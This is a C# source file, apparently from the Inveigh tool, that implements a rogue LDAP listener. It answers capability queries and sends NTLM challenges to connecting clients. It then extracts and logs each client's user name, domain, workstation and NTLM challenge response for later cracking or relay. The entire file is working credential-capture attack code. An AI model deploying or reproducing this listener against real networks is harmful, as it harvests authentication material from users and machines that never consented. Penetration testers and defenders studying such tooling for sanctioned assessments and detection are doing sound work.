using Quiddity;
using Quiddity.LDAP;
using Quiddity.NTLM;
using Quiddity.Support;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Inveigh
{
    class LDAPListener
    {

        internal void Start(IPAddress ipAddress, int port)
        {
            TCPListener tcpListener = new TCPListener(ipAddress, port);
            IAsyncResult tcpAsync;
            TcpClient tcpClient;

            try
            {
                tcpListener.Start();
            }
            catch (Exception ex)
            {

                if (ex.Message.ToString().Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
                {
                    Output.Queue(String.Format("[!] Failed to start LDAP listener on port {0}, check IP and port usage.", port));
                }
                else
                {
                    Output.Queue(ex.ToString());

                }
            }

            while (Program.isRunning)
            {
                tcpAsync = tcpListener.BeginAcceptTcpClient(null, null);

                do
                {
                    Thread.Sleep(10);

                    if (!Program.isRunning)
                    {
                        break;
                    }

                }
                while (!tcpAsync.IsCompleted);

                tcpClient = tcpListener.EndAcceptTcpClient(tcpAsync);
                object[] parameters = { tcpClient };
                ThreadPool.QueueUserWorkItem(new WaitCallback(ReceiveClient), parameters);
            }

        }

        internal void ReceiveClient(object parameters)
        {
            object[] parameterArray = parameters as object[];
            TcpClient tcpClient = (TcpClient)parameterArray[0];
            NetworkStream tcpStream = tcpClient.GetStream();
            string ntlmChallenge = "";
            string clientIP = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Address.ToString();
            string clientPort = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Port.ToString();
            string listenerPort = ((IPEndPoint)(tcpClient.Client.LocalEndPoint)).Port.ToString();

            while (tcpClient.Connected && Program.isRunning)
            {
                byte[] requestData = new byte[4096];

                do
                {
                    Thread.Sleep(100);
                }
                while (!tcpStream.DataAvailable && tcpClient.Connected);

                while (tcpStream.DataAvailable)
                {
                    tcpStream.Read(requestData, 0, requestData.Length);
                }

                LDAPMessage message = new LDAPMessage();
                message.Decode(requestData);
                LDAPMessage message2 = new LDAPMessage();
                message2.MessageID = message.MessageID;
                byte[] buffer = new byte[0];
                Output.Queue(String.Format("[.] [{0}] LDAP({1}) message type {2} request from {3}:{4}", Output.Timestamp(), listenerPort, message.Tag, clientIP, clientPort));

                if (message.Tag == 3)
                {
                    LDAPMessage message3 = new LDAPMessage();
                    message3.MessageID = message.MessageID;
                    LDAPSearchRequest searchRequest = new LDAPSearchRequest();
                    searchRequest.ReadBytes((byte[][])message.ProtocolOp);

                    LDAPSearchResDone resdone = new LDAPSearchResDone();
                    resdone.ResultCode = 0;
                    LDAPSearchResEntry search = new LDAPSearchResEntry();

                    if (String.Equals(searchRequest.Attributes[0], "supportedCapabilities"))
                    {
                        LDAPSupportedCapabilities cap = new LDAPSupportedCapabilities();
                        search.Attributes = cap.Encode();
                    }
                    else if (String.Equals(searchRequest.Attributes[0], "supportedSASLMechanisms"))
                    {
                        LDAPSupportedSASLMechanisms mech = new LDAPSupportedSASLMechanisms();
                        search.Attributes = mech.Encode();
                    }

                    message2.ProtocolOp = search;
                    message3.ProtocolOp = resdone;
                    buffer = Utilities.BlockCopy(message2.Encode(4), message3.Encode(5));
                }
                else if (message.Tag == 0)
                {
                    LDAPBindRequest bind = new LDAPBindRequest();
                    bind.ReadBytes((byte[][])message.ProtocolOp);
                    LDAPSaslCredentials sasl = new LDAPSaslCredentials();
                    sasl.ReadBytes(bind.Authentication);
                    NTLMNegotiate ntlm = new NTLMNegotiate();
                    ntlm.ReadBytes(sasl.Credentials, 0);

                    if (ntlm.MessageType == 1)
                    {
                        NTLMChallenge challenge = new NTLMChallenge(Program.argChallenge, Program.netbiosDomain, Program.computerName, Program.dnsDomain, Program.computerName, Program.dnsDomain);
                        byte[] challengeData = challenge.GetBytes(Program.computerName);
                        ntlmChallenge = BitConverter.ToString(challenge.ServerChallenge).Replace("-", "");
                        LDAPBindResponse bindResponse = new LDAPBindResponse();
                        bindResponse.ServerSaslCreds = challengeData;
                        LDAPMessage bindMessage = new LDAPMessage();
                        bindMessage.MessageID = message.MessageID;
                        bindMessage.ProtocolOp = bindResponse;
                        buffer = bindMessage.Encode(3);
                        Output.Queue(String.Format("[+] [{0}] LDAP({1}) NTLM challenge {2} sent to {3}:{4}", Output.Timestamp(), listenerPort, ntlmChallenge, clientIP, clientPort));
                    }
                    else if (ntlm.MessageType == 3)
                    {
                        NTLMResponse ntlmResponse = new NTLMResponse(sasl.Credentials, false);
                        string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
                        string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
                        string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
                        string response2 = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-", "");
                        Output.NTLMOutput(user, domain, ntlmChallenge, response2, clientIP, host, "LDAP", listenerPort, clientPort, null);
                    }

                }

                tcpStream.Write(buffer, 0, buffer.Length);
                tcpStream.Flush();
            }

        }

    }
}
